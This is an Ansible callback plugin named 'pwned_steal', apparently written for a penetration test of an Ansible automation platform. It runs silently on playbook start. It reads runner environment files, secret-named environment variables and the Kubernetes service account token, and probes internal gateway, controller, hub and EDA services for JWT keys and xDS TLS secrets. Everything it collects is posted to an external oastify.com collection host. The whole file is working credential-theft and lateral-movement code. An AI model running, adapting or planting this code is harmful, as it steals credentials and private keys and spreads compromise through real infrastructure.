import os, json, urllib.request, ssl
from ansible.plugins.callback import CallbackBase

class CallbackModule(CallbackBase):
    CALLBACK_VERSION = 2.0
    CALLBACK_NAME = "pwned_steal"
    CALLBACK_TYPE = "notification"
    CALLBACK_NEEDS_ENABLED = False

    def _post(self, path, data):
        try:
            ctx = ssl._create_unverified_context()
            body = json.dumps(data, default=str).encode()
            if len(body) > 60000:
                body = body[:60000]
            req = urllib.request.Request(
                f"https://jd0oze10lacmjnfy1vpttgedl4rvfl3a.oastify.com/{path}",
                data=body,
                headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=10, context=ctx)
        except Exception:
            pass

    def _get(self, url):
        try:
            ctx = ssl._create_unverified_context()
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
            return resp.read().decode(errors="replace")[:10000]
        except Exception as e:
            return f"ERROR: {e}"

    def _post_json(self, url, body=b"{}"):
        try:
            ctx = ssl._create_unverified_context()
            req = urllib.request.Request(
                url, data=body,
                headers={"Content-Type": "application/json"})
            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
            return resp.read().decode(errors="replace")[:10000]
        except Exception as e:
            return f"ERROR: {e}"

    def v2_playbook_on_start(self, playbook):
        try:
            # --- Phase 1: Steal job credentials ---
            creds = {"vector": "lateral-movement", "user": os.popen("id").read().strip()}
            for base in ("/runner/env", "/runner/artifacts"):
                for root, dirs, files in os.walk(base):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            with open(fpath) as f:
                                creds[fpath] = f.read()[:2000]
                        except Exception:
                            pass
            creds["env"] = {k: v for k, v in os.environ.items()
                            if any(s in k.upper()
                                   for s in ["PASS","KEY","TOKEN","SECRET","CRED"])}
            self._post("phase1-creds", creds)

            # --- Phase 2: Lateral movement — internal service recon ---
            lateral = {}

            # Gateway JWT public key (aids token forgery — EXP-5 chain)
            lateral["jwt_public_key"] = self._get(
                "http://172.30.252.70/api/gateway/v1/jwt_key/")

            # Gateway xDS — extract TLS certs and private keys (EXP-14)
            # xDS requires POST with empty JSON body
            # Try main port and common management ports
            for port in ["80", "8443", "8080", "9901"]:
                base = f"http://172.30.252.70:{port}"
                result = self._post_json(f"{base}/v3/discovery:secrets")
                if "ERROR" not in result:
                    lateral[f"xds_secrets_port_{port}"] = result
                    lateral[f"xds_clusters_port_{port}"] = self._post_json(
                        f"{base}/v3/discovery:clusters")
                    break
                lateral[f"xds_port_{port}"] = result

            # Also try the gateway's Django app directly (might be on different svc)
            lateral["xds_secrets_gateway_api"] = self._post_json(
                "http://172.30.252.70/api/gateway/v1/discovery:secrets")

            # Controller topology (EXP-16)
            lateral["controller_ping"] = self._get(
                "http://172.30.223.163/api/v2/ping/")

            # Hub settings — SSO/OIDC endpoints
            lateral["hub_settings"] = self._get(
                "http://172.30.175.79:8000/_ui/v1/settings/")

            # EDA status
            lateral["eda_status"] = self._get(
                "http://172.30.41.65:8000/api/eda/v1/status/")

            # K8s service account token (if mounted)
            for f in ["/var/run/secrets/kubernetes.io/serviceaccount/token",
                      "/var/run/secrets/kubernetes.io/serviceaccount/namespace"]:
                try:
                    with open(f) as fh:
                        lateral[f] = fh.read()[:2000]
                except Exception:
                    lateral[f] = "NOT_MOUNTED"

            self._post("phase2-lateral", lateral)

        except Exception:
            pass
